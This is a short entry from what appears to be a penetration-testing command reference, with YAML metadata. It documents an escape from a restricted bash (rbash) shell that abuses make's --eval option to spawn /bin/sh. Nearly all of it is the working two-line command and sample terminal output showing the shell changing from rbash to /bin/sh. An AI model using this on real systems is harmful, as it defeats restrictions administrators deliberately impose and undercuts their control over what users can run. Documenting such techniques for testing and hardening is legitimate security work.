---
id: 1e0b8010-b269-4999-a707-e0d2309c46bf
name: rbash Escape using make to launch bash
type: command
executor: ''
data: 'COMMAND=''/bin/sh''

  make -s --eval=$''x:\n\t-''"$COMMAND"'
output: 'method@hacker:~$ echo $0

  rbash

  method@hacker:~$ COMMAND=''/bin/sh''

  method@hacker:~$ make -s --eval=$''x:\n\t-''"$COMMAND"

  $ echo $0

  /bin/sh'
created_at: '2019-09-19T17:03:16.190965+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
tools:
- '[[make]]'
---

# rbash Escape using make to launch bash

```bash
COMMAND='/bin/sh'
make -s --eval=$'x:\n\t-'"$COMMAND"
```

## Expected Output

```
method@hacker:~$ echo $0
rbash
method@hacker:~$ COMMAND='/bin/sh'
method@hacker:~$ make -s --eval=$'x:\n\t-'"$COMMAND"
$ echo $0
/bin/sh
```


